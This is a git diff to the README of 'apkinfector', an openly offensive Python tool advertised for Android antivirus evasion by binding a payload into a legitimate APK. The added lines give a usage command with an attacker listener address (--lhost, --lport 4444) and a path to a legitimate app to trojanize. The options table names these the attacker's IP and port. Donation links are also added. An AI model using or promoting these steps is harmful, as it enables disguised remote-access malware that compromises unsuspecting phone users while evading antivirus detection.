@@ -48,7 +48,7 @@ Advanced Android Antivirus Evasion Tool Written In Python 3 that can Embed/Bind 
 ## Tested On
 [![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - 2019.4**
 
-## Installation
+## Installation & Usage
 
 ```
 
@@ -63,6 +63,12 @@ $ cd apkinfector
 
 # Installing dependencies
 $ apt-get update && apt-get install apktool && apt-get install zipalign && apt-get install apksigner
+
+# Running the Tool for 1st Time
+$ python3 infector.py --help
+
+# Usage Example
+$ python3 infector.py --lhost 192.168.43.70 --lport 4444 --apk-name NEW_APK_NAME --normal-apk /root/Desktop/Path/TO/Legitemate_APK_File.apk
 
 ```
 
@@ -80,7 +86,7 @@ $ apt-get update && apt-get install apktool && apt-get install zipalign && apt-g
 |             | --lhost 192.168.44.33  | Attacker's IP Address |
 |             | --lport 4444 | Attacker's Port |
 | -n NORMAL_APK | --normal-apk NORMAL_APK | Absolute Path of Legitimate APK File |
-|     |  --apk-name APKNAME   | Absolute Path of Legitimate APK File |
+|     |  --apk-name APKNAME   | APK Name (Anything You Want To Name) |
 
 ## Contribute
 
@@ -89,6 +95,10 @@ $ apt-get update && apt-get install apktool && apt-get install zipalign && apt-g
 ## Contact
 
 singhpushpender250@gmail.com 
+
+## Believes In Donation
+* Buy Me A Coffe : https://paypal.me/anonyindia 
+* Paypal Email : singhpushpender250@gmail.com
 
 ## More Features Coming Soon...
 
